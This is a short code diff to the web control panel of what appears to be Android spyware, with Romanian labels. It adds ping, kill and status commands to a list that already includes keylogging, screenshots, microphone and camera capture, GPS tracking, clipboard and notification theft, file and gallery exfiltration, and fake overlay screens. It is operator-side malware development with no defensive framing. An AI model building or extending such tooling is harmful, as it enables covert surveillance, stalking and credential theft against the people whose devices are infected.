@@ -1426,6 +1426,9 @@ img.shot{max-width:200px;border-radius:6px;margin:4px}
 <option value="exfil_file">exfil_file — exfiltrare fișier</option>
 <option value="exfil_gallery">exfil_gallery — exfiltrare galerie</option>
 <option value="overlay">overlay — overlay fals</option>
+<option value="ping">ping — test legătură</option>
+<option value="kill">kill — forță stop app</option>
+<option value="status">status — permisiuni + stare</option>
 </select></div>
 </div>
 <div class="form-row"><div style="flex:3"><label class="lbl">Parametri (JSON)</label><textarea id="cmdParams" rows="3" class="mono">{}</textarea></div></div>
@@ -1458,7 +1461,7 @@ function updParams(){
   const a=document.getElementById("cmdAction").value;
   const d={screenshot:{},screen_text:{},keylog:{},clipboard:{},mic:{ms:10000},camera:{},gps:{},
   gps_track:{ms:60000,everyMs:5000},device:{},apps:{},foreground:{},recent:{},usage:{},
-  notifications:{},exfil_file:{uri:""},exfil_gallery:{limit:10,since:null},overlay:{type:"wifi",title:"",body:""}};
+  notifications:{},exfil_file:{uri:""},exfil_gallery:{limit:10,since:null},overlay:{type:"wifi",title:"",body:""},ping:{},kill:{},status:{}};
   document.getElementById("cmdParams").value=JSON.stringify(d[a]||{},null,2);
 }
 async function sendCmd(){
